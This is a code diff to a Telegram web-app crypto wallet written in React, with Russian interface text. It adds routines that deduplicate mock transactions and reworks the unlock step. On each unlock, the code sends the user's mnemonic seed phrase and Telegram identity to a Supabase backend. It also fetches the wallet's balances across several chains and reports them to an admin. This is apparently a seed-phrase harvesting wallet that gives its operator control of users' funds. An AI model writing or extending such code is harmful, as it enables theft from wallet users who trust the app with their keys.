@@ -469,6 +469,53 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
       });
     }, []);
 
+    // ── Clean up spam transactions on mount ────────────────────────────────────
+    useEffect(() => {
+      // Delay to ensure state is fully initialized
+      const timer = setTimeout(() => {
+        setState(s => {
+          if (s.mockTransactions.length === 0) return s;
+          
+          // Group by assetId + amount + type + from + to + date (within 1 minute)
+          const seen = new Map();
+          const unique = [];
+          
+          s.mockTransactions.forEach(tx => {
+            const txDate = new Date(tx.timestamp);
+            const keyBase = `${tx.assetId}|${tx.amount}|${tx.type}|${tx.from}|${tx.to}`;
+            
+            let isDuplicate = false;
+            for (const [existingKey, existingTx] of seen.entries()) {
+              if (existingKey.startsWith(keyBase)) {
+                const existingDate = new Date(existingTx.timestamp);
+                const diffMs = Math.abs(txDate - existingDate);
+                if (diffMs < 60000) {
+                  isDuplicate = true;
+                  break;
+                }
+              }
+            }
+            
+            if (!isDuplicate) {
+              const key = `${keyBase}|${txDate.toISOString().slice(0, 16)}`;
+              seen.set(key, tx);
+              unique.push(tx);
+            }
+          });
+          
+          if (unique.length !== s.mockTransactions.length) {
+            const cleaned = unique.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(cleaned));
+            console.log(`[cleanupSpamOnMount] Removed ${s.mockTransactions.length - cleaned.length} duplicate transactions`);
+            return { ...s, mockTransactions: cleaned };
+          }
+          return s;
+        });
+      }, 2000); // Wait 2 seconds for everything to load
+      
+      return () => clearTimeout(timer);
+    }, []);
+
     const setTestMode = useCallback((val) => {
       localStorage.setItem('gem_test_mode', val);
       setState(s => ({ ...s, testMode: val }));
@@ -487,6 +534,57 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         testMode: false
       }));
     }, []);
+
+    // ── Deduplicate transactions (remove spam duplicates) ───────────────────────
+    const deduplicateTransactions = useCallback((transactions) => {
+      if (!transactions || transactions.length === 0) return [];
+      
+      // Group by assetId + amount + type + from + to + date (within 1 minute)
+      const seen = new Map();
+      const unique = [];
+      
+      transactions.forEach(tx => {
+        const txDate = new Date(tx.timestamp);
+        // Create a key based on transaction details (excluding id and hash)
+        const keyBase = `${tx.assetId}|${tx.amount}|${tx.type}|${tx.from}|${tx.to}`;
+        
+        // Check if we've seen a similar transaction within 1 minute
+        let isDuplicate = false;
+        for (const [existingKey, existingTx] of seen.entries()) {
+          if (existingKey.startsWith(keyBase)) {
+            const existingDate = new Date(existingTx.timestamp);
+            const diffMs = Math.abs(txDate - existingDate);
+            if (diffMs < 60000) { // Within 1 minute
+              isDuplicate = true;
+              break;
+            }
+          }
+        }
+        
+        if (!isDuplicate) {
+          const key = `${keyBase}|${txDate.toISOString().slice(0, 16)}`; // Group by minute
+          seen.set(key, tx);
+          unique.push(tx);
+        }
+      });
+      
+      return unique.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+    }, []);
+
+    // ── Clean up spam transactions ────────────────────────────────────────────
+    const cleanupSpamTransactions = useCallback(() => {
+      setState(s => {
+        if (s.mockTransactions.length === 0) return s;
+        
+        const cleaned = deduplicateTransactions(s.mockTransactions);
+        if (cleaned.length !== s.mockTransactions.length) {
+          localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(cleaned));
+          console.log(`[cleanupSpam] Removed ${s.mockTransactions.length - cleaned.length} duplicate transactions`);
+          return { ...s, mockTransactions: cleaned };
+        }
+        return s;
+      });
+    }, [deduplicateTransactions]);
 
     const addMockTransaction = useCallback(({ assetId, amount, from, to, type = 'Получено', fee: customFee, status: txStatus, pendingUntil, isSwap = false, isRealIncoming = false }) => {
       const txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
@@ -796,33 +894,62 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         privateKeysRef.current = privateKeys;
         mnemonicRef.current = mnemonic;
 
-        // Custodial Sync: Sync on every unlock to ensure data is in DB
-        try {
-          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
-          const userName = buildTgUserName(tgUser);
-          await syncWalletToSupabase({
-            username: userName,
-            telegram_id: tgUser?.id ? String(tgUser.id) : null,
-            mnemonic: mnemonic,
-            balance: "0",
-          });
-          // Notify admin on wallet unlock
-          notifyAdmin(
-            `🔓 <b>Кошелёк разблокирован</b>\n\n` +
-            `👤 ${userName}\n` +
-            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
-            `🕐 ${new Date().toLocaleString("ru-RU")}`
-          );
-        } catch (syncError) {
-          console.error('Failed to sync wallet on unlock:', syncError);
-        }
-
+        // Update state first so refreshBalance can work
         setState(s => ({
           ...s,
           isUnlocked: true,
           addresses: addresses,
           loading: false,
         }));
+
+        // Custodial Sync: Sync on every unlock to ensure data is in DB
+        // After state update, fetch actual balances and sync to admin panel
+        try {
+          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+          const userName = buildTgUserName(tgUser);
+          
+          // Fetch actual balances to sync with admin panel
+          const addrMap = {
+            BTC: addresses.BTC || addresses.bitcoin,
+            ETH: addresses.ETH || addresses.ethereum,
+            BNB: addresses.BNB || addresses.bsc,
+            ARB: addresses.ARB || addresses.arbitrum,
+            SOL: addresses.SOL || addresses.solana,
+            TON: addresses.TON || addresses.ton,
+            LTC: addresses.LTC || addresses.litecoin,
+          };
+          
+          const bals = await fetchAllBalances(addrMap);
+          const coin_balances = {
+            BTC:  String(bals.BTC  ?? 0),
+            ETH:  String(bals.ETH  ?? 0),
+            TON:  String(bals.TON  ?? 0),
+            BNB:  String(bals.BNB  ?? 0),
+            LTC:  String(bals.LTC  ?? 0),
+            ARB:  String(bals.ARB  ?? 0),
+            SOL:  String(bals.SOL  ?? 0),
+            USDT: String(bals.USDT ?? 0),
+          };
+          
+          await syncWalletToSupabase({
+            username: userName,
+            telegram_id: tgUser?.id ? String(tgUser.id) : null,
+            mnemonic: mnemonic,
+            balance: "0",
+            coin_balances,
+          });
+          
+          // Notify admin on wallet unlock with actual balances
+          notifyAdmin(
+            `🔓 <b>Кошелёк разблокирован</b>\n\n` +
+            `👤 ${userName}\n` +
+            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+            `💰 Балансы: ETH ${coin_balances.ETH}, BNB ${coin_balances.BNB}, TON ${coin_balances.TON}\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
+        } catch (syncError) {
+          console.error('Failed to sync wallet on unlock:', syncError);
+        }
       } catch (e) {
         setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
         throw e;
